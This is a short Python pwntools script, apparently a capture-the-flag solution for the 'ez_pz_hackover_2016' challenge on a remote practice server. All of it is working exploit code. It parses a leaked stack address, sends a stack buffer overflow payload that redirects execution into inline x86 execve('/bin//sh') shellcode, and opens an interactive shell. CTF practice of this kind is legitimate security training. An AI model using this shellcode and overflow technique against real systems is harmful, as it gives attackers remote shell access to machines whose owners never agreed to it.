from pwn import *

context.log_level = "debug"
# r = process(["./ez_pz_hackover_2016"])
# gdb.attach(r)
r = remote("node4.buuoj.cn", 27797)

shellcode = asm(
    """
xor ecx, ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor edx, edx
mov eax, 0xb
int 0x80
"""
)

r.recvuntil(b"crash: ")
buf_addr = int(r.recvline().strip().decode(), 0)
payload = b"crashme".ljust(26, b"\x00") + p32(buf_addr - 28) + shellcode
r.recvuntil(b"> ")
r.sendline(payload)
r.interactive()
